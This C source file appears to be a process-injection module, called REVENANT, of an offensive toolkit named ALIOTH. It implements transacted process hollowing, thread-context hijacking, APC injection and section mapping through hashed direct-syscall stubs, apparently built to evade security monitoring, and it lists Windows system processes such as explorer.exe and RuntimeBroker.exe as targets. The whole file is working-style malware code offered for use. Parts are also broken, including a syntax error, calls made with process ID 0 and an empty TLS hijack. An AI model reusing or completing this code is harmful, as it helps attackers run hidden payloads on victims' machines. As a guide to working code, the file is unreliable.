#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL RevenantScanTargets() {
    static const CHAR* g_Targets[] = {
        "RuntimeBroker.exe",
        "sihost.exe",
        "taskhostw.exe",
        "rundll32.exe",
        "dllhost.exe",
        "backgroundTaskHost.exe",
        "SystemSettings.exe",
        "explorer.exe"
    };
    
    for (int i = 0; i < 8; i++) {
        printf("[*] Target %d: %s\n", i, g_Targets[i]);
    }
    return TRUE;
}

BOOL RevenantTransactedHollow(PCHAR pcTarget, PVOID pPayload, DWORD dwSize) {
    DWORD64 hCreateTrans = ALIOTHSyscallHash((PCHAR)"NtCreateTransaction");
    DWORD64 hCreateSection = ALIOTHSyscallHash((PCHAR)"NtCreateSection");
    DWORD64 hMapView = ALIOTHSyscallHash((PCHAR)"NtMapViewOfSection");
    DWORD64 hUnmapView = ALIOTHSyscallHash((PCHAR)"NtUnmapViewOfSection");
    DWORD64 hRollback = ALIOTHSyscallHash((PCHAR)"NtRollbackTransaction");
    
    fnNtCreateTransaction pCreateTrans = (fnNtCreateTransaction)ALIOTHGetSyscallStub(hCreateTrans);
    fnNtCreateSection pCreateSection = (fnNtCreateSection)ALIOTHGetSyscallStub(hCreateSection);
    fnNtMapViewOfSection pMapView = (fnNtMapViewOfSection)ALIOTHGetSyscallStub(hMapView);
    fnNtUnmapViewOfSection pUnmapView = (fnNtUnmapViewOfSection)ALIOTHGetSyscallStub(hUnmapView);
    fnNtRollbackTransaction pRollback = (fnNtRollbackTransaction)ALIOTHGetSyscallStub(hRollback);
    
    if (!pCreateTrans || !pCreateSection || !pMapView || !pUnmapView || !pRollback) return FALSE;
    
    HANDLE hTransaction = NULL;
    NTSTATUS status = ExecuteSyscall(pCreateTrans, Mask_Worker, &hTransaction, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || !hTransaction) return FALSE;
    
    HANDLE hFile = CreateFileA(pcTarget, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { ExecuteSyscall(pRollback, Mask_Worker, hTransaction, TRUE); return FALSE; }
    
    HANDLE hSection = NULL;
    LARGE_INTEGER liMax = {0};
    status = ExecuteSyscall(pCreateSection, Mask_Worker, &hSection, SECTION_ALL_ACCESS, NULL, &liMax, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status) || !hSection) { ExecuteSyscall(pRollback, Mask_Worker, hTransaction, TRUE); return FALSE; }
    
    PVOID pBase = NULL; SIZE_T szView = 0;
    status = ExecuteSyscall(pMapView, Mask_Memory, hSection, (HANDLE)-1, &pBase, 0, &szView, 0, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status)) { CloseHandle(hSection); ExecuteSyscall(pRollback, Mask_Worker, hTransaction, TRUE); return FALSE; }
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((PBYTE)&pNt->OptionalHeader + pNt->FileHeader.SizeOfOptionalHeader);
    
    PVOID pTextAddr = NULL; DWORD dwTextSize = 0;
    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
        if (*(DWORD*)pSections[s].Name == 0x74786574) {
            pTextAddr = (PBYTE)pBase + pSections[s].VirtualAddress;
            dwTextSize = pSections[s].Misc.VirtualSize;
            break;
        }
    }
    
    if (!pTextAddr || dwSize > dwTextSize) {
        ExecuteSyscall(pUnmapView, Mask_Memory, (HANDLE)-1, pBase);
        CloseHandle(hSection);
        ExecuteSyscall(pRollback, Mask_Worker, hTransaction, TRUE);
        return FALSE;
    }
    
    ULONG ulOld = 0; SIZE_T szSize = dwTextSize;
    ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtProtectVirtualMemory")), Mask_Security, (HANDLE)-1, &pTextAddr, &szSize, PAGE_EXECUTE_READWRITE, &ulOld);
    
    DWORD64 hWrite = ALIOTHSyscallHash((PCHAR)"NtWriteVirtualMemory");
    fnNtWriteVirtualMemory pWrite = (fnNtWriteVirtualMemory)ALIOTHGetSyscallStub(hWrite);
    SIZE_T dwWritten = 0;
    ExecuteSyscall(pWrite, Mask_Memory, (HANDLE)-1, pTextAddr, pPayload, dwSize, &dwWritten);
    
    ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtProtectVirtualMemory")), Mask_Security, (HANDLE)-1, &pTextAddr, &szSize, PAGE_EXECUTE_READ, &ulOld);
    
    ExecuteSyscall(pRollback, Mask_Worker, hTransaction, TRUE);
    
    ExecuteSyscall(pUnmapView, Mask_Memory, (HANDLE)-1, pBase);
    CloseHandle(hSection);
    CloseHandle(hTransaction);
    
    return TRUE;
}

BOOL RevenantThreadHijack(DWORD dwTargetPid, PVOID pShellcode) {
    DWORD64 hOpenProc = ALIOTHSyscallHash((PCHAR)"NtOpenProcess");
    DWORD64 hOpenThread = ALIOTHSyscallHash((PCHAR)"NtOpenThread");
    DWORD64 hGetCtx = ALIOTHSyscallHash((PCHAR)"NtGetContextThread");
    DWORD64 hSetCtx = ALIOTHSyscallHash((PCHAR)"NtSetContextThread");
    DWORD64 hSuspend = ALIOTHSyscallHash((PCHAR)"NtSuspendThread");
    DWORD64 hResume = ALIOTHSyscallHash((PCHAR)"NtResumeThread");
    
    fnNtOpenProcess pOpenProc = (fnNtOpenProcess)ALIOTHGetSyscallStub(hOpenProc);
    fnNtOpenThread pOpenThread = (fnNtOpenThread)ALIOTHGetSyscallStub(hOpenThread);
    fnNtGetContextThread pGetCtx = (fnNtGetContextThread)ALIOTHGetSyscallStub(hGetCtx);
    fnNtSetContextThread pSetCtx = (fnNtSetContextThread)ALIOTHGetSyscallStub(hSetCtx);
    fnNtSuspendThread pSuspend = (fnNtSuspendThread)ALIOTHGetSyscallStub(hSuspend);
    fnNtResumeThread pResume = (fnNtResumeThread)ALIOTHGetSyscallStub(hResume);
    
    if (!pOpenProc || !pOpenThread || !pGetCtx || !pSetCtx || !pSuspend || !pResume) return FALSE;
    
    HANDLE hProcess = NULL;
    CLIENT_ID cidProc = { (HANDLE)(ULONG_PTR)dwTargetPid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    ExecuteSyscall(pOpenProc, Mask_Worker, &hProcess, PROCESS_ALL_ACCESS, &oa, &cidProc);
    if (!hProcess) return FALSE;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    HANDLE hThread = NULL;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPid) {
                CLIENT_ID cidThread = { NULL, te.th32ThreadID };
                ExecuteSyscall(pOpenThread, Mask_Worker, &hThread, THREAD_ALL_ACCESS, &oa, &cidThread);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    
    if (!hThread) { ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose")), Mask_Worker, hProcess); return FALSE; }
    
    DWORD dwSuspendCount = 0;
    ExecuteSyscall(pSuspend, Mask_Worker, hThread, &dwSuspendCount);
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    ExecuteSyscall(pGetCtx, Mask_Worker, hThread, &ctx);
    
    DWORD64 dwOriginalRip = 0;
#ifdef _WIN64
    dwOriginalRip = ctx.Rip;
    ctx.Rip = (DWORD64)pShellcode;
#else
    dwOriginalRip = ctx.Eip;
    ctx.Eip = (DWORD)pShellcode;
#endif
    
    ExecuteSyscall(pSetCtx, Mask_Security, hThread, &ctx);
    ExecuteSyscall(pResume, Mask_Worker, hThread, &dwSuspendCount);
    
    ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose")), Mask_Worker, hThread);
    ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose")), Mask_Worker, hProcess);
    
    return TRUE;
}

BOOL RevenantApcFallback(DWORD dwTargetPid, PVOID pShellcode) {
    DWORD64 hOpenProc = ALIOTHSyscallHash((PCHAR)"NtOpenProcess");
    DWORD64 hQueueApc = ALIOTHSyscallHash((PCHAR)"NtQueueApcThread");
    
    fnNtOpenProcess pOpenProc = (fnNtOpenProcess)ALIOTHGetSyscallStub(hOpenProc);
    fnNtQueueApcThread pQueueApc = (fnNtQueueApcThread)ALIOTHGetSyscallStub(hQueueApc);
    
    if (!pOpenProc || !pQueueApc) return FALSE.
    
    HANDLE hProcess = NULL;
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwTargetPid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    ExecuteSyscall(pOpenProc, Mask_Worker, &hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hProcess) return FALSE;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPid) {
                CLIENT_ID cidThread = { NULL, te.th32ThreadID };
                HANDLE hThread = NULL;
                DWORD64 hOpenThread = ALIOTHSyscallHash((PCHAR)"NtOpenThread");
                fnNtOpenThread pOpenThread = (fnNtOpenThread)ALIOTHGetSyscallStub(hOpenThread);
                if (pOpenThread) {
                    ExecuteSyscall(pOpenThread, Mask_Worker, &hThread, THREAD_SET_CONTEXT, &oa, &cidThread);
                    if (hThread) {
                        ExecuteSyscall(pQueueApc, Mask_Worker, hThread, pShellcode, NULL, NULL);
                        ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose")), Mask_Worker, hThread);
                    }
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    
    ExecuteSyscall(ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose")), Mask_Worker, hProcess);
    return TRUE;
}

BOOL RevenantSectionHandoff(PCHAR pcTarget, PVOID pPayload, DWORD dwSize) {
    DWORD64 hCreateSection = ALIOTHSyscallHash((PCHAR)"NtCreateSection");
    DWORD64 hMapView = ALIOTHSyscallHash((PCHAR)"NtMapViewOfSection");
    DWORD64 hUnmapView = ALIOTHSyscallHash((PCHAR)"NtUnmapViewOfSection");
    
    fnNtCreateSection pCreateSection = (fnNtCreateSection)ALIOTHGetSyscallStub(hCreateSection);
    fnNtMapViewOfSection pMapView = (fnNtMapViewOfSection)ALIOTHGetSyscallStub(hMapView);
    fnNtUnmapViewOfSection pUnmapView = (fnNtUnmapViewOfSection)ALIOTHGetSyscallStub(hUnmapView);
    
    if (!pCreateSection || !pMapView || !pUnmapView) return FALSE;
    
    HANDLE hSection = NULL;
    LARGE_INTEGER liMax = { (LONGLONG)dwSize };
    ExecuteSyscall(pCreateSection, Mask_Worker, &hSection, SECTION_ALL_ACCESS, NULL, &liMax, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!hSection) return FALSE;
    
    PVOID pLocal = NULL; SIZE_T szView = dwSize;
    ExecuteSyscall(pMapView, Mask_Memory, hSection, (HANDLE)-1, &pLocal, 0, &szView, 0, 0, PAGE_READWRITE);
    if (!pLocal) { CloseHandle(hSection); return FALSE; }
    
    memcpy(pLocal, pPayload, dwSize);
    ExecuteSyscall(pUnmapView, Mask_Memory, (HANDLE)-1, pLocal);
    
    CloseHandle(hSection);
    return TRUE;
}

BOOL RevenantTlsCallbackHijack(PCHAR pcTarget, PVOID pShellcode) {
    HANDLE hFile = CreateFileA(pcTarget, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    PBYTE pMapping = (PBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pMapping + pDos->e_lfanew);
    
    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0) {
        UnmapViewOfFile(pMapping);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    PIMAGE_TLS_DIRECTORY64 pTls = (PIMAGE_TLS_DIRECTORY64)(pMapping + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
    
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return FALSE;
}

DWORD RevenantMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','R','E','V','E','N','A','N','T',' ','-',' ','P','R','O','C','E','S','S',' ','H','O','L','L','O','W','I','N','G',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    RevenantScanTargets();
    
    if (pParams->revenant.pcPayloadPath) {
        HANDLE hFile = CreateFileA(pParams->revenant.pcPayloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD dwSize = GetFileSize(hFile, NULL);
            PBYTE pPayload = (PBYTE)LocalAlloc(LPTR, dwSize);
            ReadFile(hFile, pPayload, dwSize, &dwSize, NULL);
            CloseHandle(hFile);
            
            if (pParams->revenant.dwTechnique == 1) {
                RevenantTransactedHollow(pParams->revenant.pcTargetProcess, pPayload, dwSize);
            } else if (pParams->revenant.dwTechnique == 2) {
                RevenantThreadHijack(0, pPayload);
            } else if (pParams->revenant.dwTechnique == 3) {
                RevenantApcFallback(0, pPayload);
            } else {
                RevenantTransactedHollow(pParams->revenant.pcTargetProcess, pPayload, dwSize);
            }
            
            LocalFree(pPayload);
        }
    }
    
    return 0;
}
#pragma optimize("", on)
